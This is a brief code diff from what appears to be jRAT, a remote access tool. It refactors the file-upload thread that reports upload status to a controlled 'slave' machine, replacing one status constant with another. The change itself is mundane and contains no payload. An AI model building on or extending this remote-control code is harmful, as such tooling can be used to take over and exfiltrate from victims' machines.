@@ -1,6 +1,5 @@
 package jrat.module.fs;
 
-import jrat.common.Transfer;
 import jrat.common.TransferRunnable;
 import jrat.common.io.TransferData;
 import jrat.controller.Slave;
@@ -73,7 +72,7 @@ public class ThreadUploadFile extends TransferRunnable {
 	}
 	
 	public void onComplete() {
-		slave.addToSendQueue(new Packet102UploadState(Transfer.Complete, data.getRemoteFile()));
+		slave.addToSendQueue(new Packet102UploadState(TransferData.State.COMPLETED, data.getRemoteFile()));
 	}
 
 	public void setSlave(Slave slave) {
